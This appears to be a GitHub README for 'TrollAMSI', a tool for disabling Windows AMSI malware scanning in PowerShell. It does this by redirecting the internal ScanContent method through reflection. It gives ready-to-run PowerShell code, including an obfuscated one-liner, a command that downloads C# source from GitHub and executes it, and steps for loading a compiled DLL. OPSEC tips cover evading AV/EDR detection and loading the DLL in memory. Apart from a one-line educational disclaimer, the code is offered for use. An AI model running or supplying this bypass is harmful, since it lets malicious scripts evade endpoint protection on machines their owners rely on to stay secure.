# TrollAMSI
![ss](https://github.com/cybersectroll/TrollAMSI/assets/169176042/b367cf14-57a1-4491-9ae8-1cddaef03deb) \
**Note:** Every other technique in the internet patches different amsi function. We are <ins>**NOT**</ins> patching the actual function here.

Matt Graeber first introduced the technique to bypass AMSI by using reflection in 2016. The technique primarily targets field attributes. **Source:** https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Using-Matt-Graebers-Reflection-method. Here, we bring us back to 2016 by targetting methods which I call a new technique "Reflection with method swapping" (i.e essentially monkeypatching). In our specific case, we use reflection to get a handle to the "ScanContent" method and updates it to point to a method we control. Additionally, this opens doors for other techniques such as ETW and CLM possibly(?). AMSI bypasses are usually detected at 2 stages:
1. The attempt to bypass -> both static and dynamic
2. The bypass itself -> Post bypass, the signatures left behind

**The beauty of this technique as opposed to other AMSI bypass techniques such as byte patching etc for the 2 detections mentioned above is:**
1. There is a low detection surface:
    - statically: because the code profile is so short and it is hard to apply a signature on any part of the common .NET functionality used
    - dynmically: because of the lack of hooked win32 API calls 
2. Because we are modifying JIT/IL memory which is hard for AV/EDR to monitor or has not been monitored at this point by a lot of vendors

```diff
! UPDATE 31/05/2024 
! For some security products, modify method M to pass in empty argument string c.
! For CSHARP example, private static int M(string c, string s) { c = ""; return 1; }
! For POWERSHELL example, class TrollAMSI{static [int] M([string]$c, [string]$s){ $c = ""; return 1}}
```
```diff
! UPDATE 05/06/2024 
! Refer to TrollAMSIdotnet for amsi bypass for Assembly.Load()
```

## Benefits
- No P/Invoke or win32 API calls used such as VirtualProtect hence **WAAAAAY more opsec safe**
- No amsi.dll patching or byte patching for that matter
  
## Usage 

### Raw Powershell
```
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}
$o = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent
$t = [TrollAMSI].GetMethods() | Where-Object Name -eq 'M'
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($t.MethodHandle)  
#[System.Runtime.CompilerServices.RuntimeHelpers]::PrepareMethod($o.MethodHandle)
[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]$t.MethodHandle.Value + [long]8)),0, [long]$o.MethodHandle.Value + [long]8,1)
```
### Raw Powershell One-Liner
```
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```

### Add-Type
```
>$code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollAMSI/main/TrollAMSI.cs).content
>Add-Type $code
>[TrollAMSI]::troll()
```
### Compiled x64
```
>c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:library /out:TrollAMSI.dll TrollAMSI.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
>[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\TrollAMSI.dll"))
>[TrollAMSI]::troll()
```

## OPSEC
- STATIC: obfuscate "AmsiUtils" and "ScanContent" maybe?
- DYNAMIC: Nothing much really. Note that Add-Type method will leave disk artifacts, whereas hosting the compiled DLL on a webserver and using Load() is completely in memory

## TESTING
- Tested on 5 AV/EDR products
- Eitherway security products pay greater emphasis to amsi.dll and the relevant winapi calls for byte patching which we do not touch
  
## Wishlist
- same technique should/could be applicable to bypass
  - ETW write
  - We can apply the same trick on CLM enforcement -> Refer to TrollCLM
  - maybe there's more?
## Credits
1. Matt Graeber original amsi bypass in 2016
2. https://github.com/calebstewart/bypass-clm


## Disclaimer
Should only be used for educational purposes!
